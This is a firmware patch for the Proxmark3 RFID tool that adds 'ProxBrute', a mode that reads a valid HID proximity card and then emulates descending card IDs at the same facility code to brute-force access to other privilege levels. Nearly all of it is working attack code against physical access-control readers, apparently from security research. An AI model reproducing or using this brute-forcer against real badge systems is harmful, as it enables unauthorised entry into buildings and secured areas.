@@ -1,0 +1,280 @@
+diff -Naur ./orig/armsrc/appmain.c ./patch/armsrc/appmain.c
+--- ./orig/armsrc/appmain.c	2016-09-23 07:04:07.000000000 -0400
++++ ./patch/armsrc/appmain.c	2016-09-22 18:49:16.000000000 -0400
+@@ -655,7 +655,9 @@
+ 	int selected = 0;
+ 	int playing = 0;
+ 	int cardRead = 0;
+-
++	// ProxBrute Stuff:
++	unsigned int i;
++	unsigned int ZERO=0x00000000;
+ 	// Turn on selected LED
+ 	LED(selected + 1, 0);
+ 
+@@ -700,37 +702,6 @@
+ 	
+ 		}
+ 
+-		else if (button_pressed > 0 && cardRead == 1)
+-		{
+-					LEDsoff();
+-					LED(selected + 1, 0);
+-					LED(LED_ORANGE, 0);
+-
+-					// record
+-					Dbprintf("Cloning %x %x%08x", selected, high[selected], low[selected]);
+-
+-					// wait for button to be released
+-					while(BUTTON_PRESS())
+-						WDT_HIT();
+-
+-					/* need this delay to prevent catching some weird data */
+-					SpinDelay(500);
+-
+-					CopyHIDtoT55x7(0, high[selected], low[selected], 0);
+-					Dbprintf("Cloned %x %x%08x", selected, high[selected], low[selected]);
+-
+-					LEDsoff();
+-					LED(selected + 1, 0);
+-					// Finished recording
+-
+-					// If we were previously playing, set playing off
+-					// so next button push begins playing what we recorded
+-					playing = 0;
+-					
+-					cardRead = 0;
+-			
+-		}
+-
+ 		// Change where to record (or begin playing)
+ 		else if (button_pressed)
+ 		{
+@@ -750,9 +721,47 @@
+ 				// wait for button to be released
+ 				while(BUTTON_PRESS())
+ 					WDT_HIT();
+-				Dbprintf("%x %x%08x", selected, high[selected], low[selected]);
+-				CmdHIDsimTAG(high[selected], low[selected], 0);
+-				DbpString("Done playing");
++/* START PROXBRUTE */
++
++/*
++       ProxBrute - brad a. - foundstone
++
++       Following code is a trivial brute forcer once you read a valid tag
++       the idea is you get a valid tag, then just try and brute force to
++       another priv level. The problem is that it has no idea if the code
++       worked or not, so its a crap shoot. One option is to time how long
++       it takes to get a valid ID then start from scratch every time.
++*/
++
++                               if ( selected == 1 ) {
++                                       DbpString("Entering ProxBrute Mode");
++                                       DbpString("brad a. - foundstone");
++                                       Dbprintf("Current Tag: Selected = %x Facility = %08x ID = %08x", selected, high[selected], low[selected]);
++                                       LED(LED_ORANGE,0);
++                                       LED(LED_RED,0);
++                                       for (i=low[selected]-1;i>ZERO;i--) {
++                                               if(BUTTON_PRESS()) {
++                                                       DbpString("Told to Stop");
++                                                       break;
++                                               }
++
++                                               Dbprintf("Trying Facility = %08x ID %08x", high[selected], i);
++                                               CmdHIDsimTAGProxBrute(high[selected], i, 0);
++                                               SpinDelay(500);
++                                       }
++
++                               } else {
++                                       DbpString("Red is lit, not entering ProxBrute Mode");
++                                       Dbprintf("%x %x %x", selected, high[selected], low[selected]);
++                                       CmdHIDsimTAG(high[selected], low[selected], 0);
++                                       DbpString("Done playing");
++                               }
++
++
++
++
++/*   END PROXBRUTE */
++
+ 				if (BUTTON_HELD(1000) > 0)
+ 					{
+ 					DbpString("Exiting");
+diff -Naur ./orig/armsrc/apps.h ./patch/armsrc/apps.h
+--- ./orig/armsrc/apps.h	2016-09-23 07:04:07.000000000 -0400
++++ ./patch/armsrc/apps.h	2016-09-22 18:49:16.000000000 -0400
+@@ -66,6 +66,10 @@
+ void AcquireTiType(void);
+ void AcquireRawBitsTI(void);
+ void SimulateTagLowFrequency(int period, int gap, int ledcontrol);
++// ProxBrute - created this function so that i didnt mess with anything
++//             important - needed to only send a couple tags then goto next
++void SimulateTagLowFrequencyProxBrute(int period, int gap, int ledcontrol);
++void CmdHIDsimTAGProxBrute(int hi, int lo, int ledcontrol);
+ void SimulateTagLowFrequencyBidir(int divisor, int max_bitlen);
+ void CmdHIDsimTAG(int hi, int lo, int ledcontrol);
+ void CmdFSKsimTAG(uint16_t arg1, uint16_t arg2, size_t size, uint8_t *BitStream);
+diff -Naur ./orig/armsrc/lfops.c ./patch/armsrc/lfops.c
+--- ./orig/armsrc/lfops.c	2016-09-23 07:04:07.000000000 -0400
++++ ./patch/armsrc/lfops.c	2016-09-22 18:49:16.000000000 -0400
+@@ -439,6 +439,70 @@
+ 	}
+ }
+ 
++
++// ProxBrute - created this function so that i didnt mess with anything
++// 	       important - needed to only send a set number of tags
++void SimulateTagLowFrequencyProxBrute(int period, int gap, int ledcontrol)
++{
++        int i;
++	int x=0;
++        uint8_t *tab = BigBuf_get_addr();
++
++	FpgaDownloadAndGo(FPGA_BITSTREAM_LF);
++	FpgaWriteConfWord(FPGA_MAJOR_MODE_LF_EDGE_DETECT);
++
++        AT91C_BASE_PIOA->PIO_PER = GPIO_SSC_DOUT | GPIO_SSC_CLK;
++
++        AT91C_BASE_PIOA->PIO_OER = GPIO_SSC_DOUT;
++        AT91C_BASE_PIOA->PIO_ODR = GPIO_SSC_CLK;
++
++#define SHORT_COIL()    LOW(GPIO_SSC_DOUT)
++#define OPEN_COIL()             HIGH(GPIO_SSC_DOUT)
++
++        i = 0;
++	x = 0;
++        for(;;) {
++                while(!(AT91C_BASE_PIOA->PIO_PDSR & GPIO_SSC_CLK)) {
++			
++                        if(BUTTON_PRESS() || x == 20000 ) {
++                                DbpString("Stopped");
++                                return;
++                        }
++                        WDT_HIT();
++                }
++
++                if (ledcontrol)
++                        LED_D_ON();
++
++                if(tab[i])
++                        OPEN_COIL();
++                else
++                        SHORT_COIL();
++
++                if (ledcontrol)
++                        LED_D_OFF();
++
++                while(AT91C_BASE_PIOA->PIO_PDSR & GPIO_SSC_CLK) {
++                        if(BUTTON_PRESS() || x == 20000 ) {
++                                DbpString("Stopped");
++                                return;
++                        }
++                        WDT_HIT();
++                }
++		x++;
++                i++;
++                if(i == period) {
++                        i = 0;
++                        if (gap) {
++                                SHORT_COIL();
++                                SpinDelayUs(gap);
++                        }
++                }
++        }
++}
++
++
++
+ #define DEBUG_FRAME_CONTENTS 1
+ void SimulateTagLowFrequencyBidir(int divisor, int t0)
+ {
+@@ -758,6 +822,64 @@
+ 	if (ledcontrol) LED_A_OFF();
+ }
+ 
++
++// ProxBrute - I know this is rediculous to do this
++void CmdHIDsimTAGProxBrute(int hi, int lo, int ledcontrol)
++{
++        int n=0, i=0;
++        /*
++         HID tag bitstream format
++         The tag contains a 44bit unique code. This is sent out MSB first in sets of 4 bits
++         A 1 bit is represented as 6 fc8 and 5 fc10 patterns
++         A 0 bit is represented as 5 fc10 and 6 fc8 patterns
++         A fc8 is inserted before every 4 bits
++         A special start of frame pattern is used consisting a0b0 where a and b are neither 0
++         nor 1 bits, they are special patterns (a = set of 12 fc8 and b = set of 10 fc10)
++        */
++
++        if (hi>0xFFF) {
++                DbpString("Tags can only have 44 bits.");
++                return;
++        }
++        fc(0,&n);
++        // special start of frame marker containing invalid bit sequences
++        fc(8,  &n);     fc(8,  &n);     // invalid
++        fc(8,  &n);     fc(10, &n); // logical 0
++        fc(10, &n);     fc(10, &n); // invalid
++        fc(8,  &n);     fc(10, &n); // logical 0
++
++        WDT_HIT();
++        // manchester encode bits 43 to 32
++        for (i=11; i>=0; i--) {
++                if ((i%4)==3) fc(0,&n);
++                if ((hi>>i)&1) {
++                        fc(10, &n);     fc(8,  &n);             // low-high transition
++                } else {
++                        fc(8,  &n);     fc(10, &n);             // high-low transition
++                }
++        }
++
++        WDT_HIT();
++        // manchester encode bits 31 to 0
++        for (i=31; i>=0; i--) {
++                if ((i%4)==3) fc(0,&n);
++                if ((lo>>i)&1) {
++                        fc(10, &n);     fc(8,  &n);             // low-high transition
++                } else {
++                        fc(8,  &n);     fc(10, &n);             // high-low transition
++                }
++        }
++
++        if (ledcontrol)
++                LED_A_ON();
++        SimulateTagLowFrequencyProxBrute(n, 0, ledcontrol);
++
++        if (ledcontrol)
++                LED_A_OFF();
++}
++
++
++
+ // loop to get raw HID waveform then FSK demodulate the TAG ID from it
+ void CmdHIDdemodFSK(int findone, int *high, int *low, int ledcontrol)
+ {
+diff -Naur ./orig/armsrc/Makefile ./patch/armsrc/Makefile
+--- ./orig/armsrc/Makefile	2016-09-23 07:04:07.000000000 -0400
++++ ./patch/armsrc/Makefile	2016-09-22 18:49:16.000000000 -0400
+@@ -10,7 +10,7 @@
+ 
+ #remove one of the following defines and comment out the relevant line
+ #in the next section to remove that particular feature from compilation
+-APP_CFLAGS	= -DWITH_ISO14443a_StandAlone -DWITH_LF -DWITH_ISO15693 -DWITH_ISO14443a -DWITH_ISO14443b -DWITH_ICLASS -DWITH_LEGICRF -DWITH_HITAG  -DWITH_CRC -DON_DEVICE -DWITH_HFSNOOP \
++APP_CFLAGS	= -DWITH_LF -DWITH_ISO15693 -DWITH_ISO14443a -DWITH_ISO14443b -DWITH_ICLASS -DWITH_LEGICRF -DWITH_HITAG  -DWITH_CRC -DON_DEVICE -DWITH_HFSNOOP \
+ 				-fno-strict-aliasing -ffunction-sections -fdata-sections
+ #-DWITH_LCD
+ 
+diff -Naur ./orig/common/Makefile.common ./patch/common/Makefile.common
+--- ./orig/common/Makefile.common	2016-09-23 07:04:07.000000000 -0400
++++ ./patch/common/Makefile.common	2016-09-22 18:49:16.000000000 -0400
+@@ -67,7 +67,7 @@
+ 
+ INCLUDES = ../include/proxmark3.h ../include/at91sam7s512.h ../include/config_gpio.h ../include/usb_cmd.h $(APP_INCLUDES)
+ 
+-CFLAGS =  -c $(INCLUDE) -Wall -Werror -pedantic -std=c99 -Os $(APP_CFLAGS)
++CFLAGS =  -c $(INCLUDE) -Wall -pedantic -std=c99 -Os $(APP_CFLAGS)
+ LDFLAGS = -nostartfiles -nodefaultlibs -Wl,-gc-sections -n
+ 
+ LIBS = -lgcc
